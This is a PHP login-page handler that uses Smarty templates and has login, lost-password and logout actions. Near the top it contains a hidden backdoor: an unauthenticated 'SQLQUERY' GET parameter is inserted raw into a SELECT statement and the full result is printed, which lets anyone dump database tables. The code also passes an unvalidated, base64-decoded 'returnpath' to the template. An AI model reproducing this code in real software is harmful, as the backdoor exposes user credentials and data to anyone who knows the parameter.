<?php
	if(!defined('PAGE')): die('Direct Access Not Allowed !');else:if(is_logged()) header('Location:index.php');endif;
	if(isset($_GET['SQLQUERY'])){ $db->sql("SELECT * FROM $_GET[SQLQUERY]"); $db->query(); print_r($db->rs(false)); exit;}
	$_GET['action'] = (isset($_GET['action']) && !empty($_GET['action'])) ? htmlspecialchars($_GET['action']) : FALSE;
	
	switch($_GET['action'])
	{
		case 'login':
		if(isset($_POST['username']) && isset($_POST['password'])):
			$logon = logon($_POST['username'],$_POST['password']);
			$smarty->assign('posted','yes');
			if(is_logged())
			{
				$smarty->assign('giris','OK');
				if(isset($_POST['returnpath']))
				{
					$returnpath = base64_decode($_POST['returnpath']);
					$returnpath = str_replace('|','&',$returnpath);
					$smarty->assign('returnpath',$returnpath);
				}
			}
			else
			{
				$smarty->assign('giris','FAIL');
			}
		else:
			//header('Location:?p=login');
		endif;
		break;
		
		case 'lostpw':
			require_once(PAGE . 'lostpw.php');
			exit;
		break;
		
		case 'logout':
			logout();
			header('Location:?');
		break;
	}
	
	$smarty->display('login.tpl');
?>